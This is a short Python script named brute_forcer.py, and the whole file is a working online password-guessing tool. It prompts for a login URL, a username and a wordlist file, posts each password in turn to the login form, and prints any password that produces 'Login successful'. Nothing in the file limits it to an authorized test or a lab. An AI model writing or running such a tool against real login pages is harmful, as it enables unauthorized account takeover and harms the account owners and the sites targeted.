# brute_forcer.py
import requests

def brute_force_login(url, username, password_list):
    for password in password_list:
        response = requests.post(url, data={'username': username, 'password': password})
        if "Login successful" in response.text:
            print(f"Success! Found password: {password}")
            return password
    print("Brute force attempt failed.")
    return None

if __name__ == "__main__":
    url = input("Enter the login URL: ")
    username = input("Enter the username: ")
    password_file = input("Enter path to password list file: ")

    try:
        with open(password_file, 'r') as file:
            password_list = file.readlines()

        brute_force_login(url, username, [pwd.strip() for pwd in password_list])
    except FileNotFoundError:
        print("Password list file not found.")

